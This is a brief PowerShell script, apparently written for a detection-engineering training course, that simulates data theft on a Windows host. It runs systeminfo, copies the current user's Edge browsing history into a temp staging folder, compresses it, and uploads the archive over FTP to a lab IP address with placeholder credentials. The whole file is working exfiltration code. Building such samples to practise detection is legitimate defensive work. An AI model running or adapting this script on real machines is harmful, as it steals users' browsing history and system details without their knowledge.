#Created for TCM Academy Detection Engineering 101 course

Start-Sleep -Seconds 5
systeminfo > C:\Windows\Temp\exfil\sysinfo.txt
$browsing_history_file_path = "C:\Users\" + $Env:UserName + "\AppData\Local\Microsoft\Edge\User Data\Default\History"
cp $browsing_history_file_path C:\WIndows\Temp\exfil
Compress-Archive -LiteralPath C:\Windows\Temp\exfil -DestinationPath C:\Windows\Temp\exfil.zip
$client = New-Object System.Net.WebClient
$client.Credentials = New-Object System.Net.NetworkCredential("user", "pass")
$client.UploadFile("ftp://192.168.56.101/exfil.zip","C:\Windows\Temp\exfil.zip")
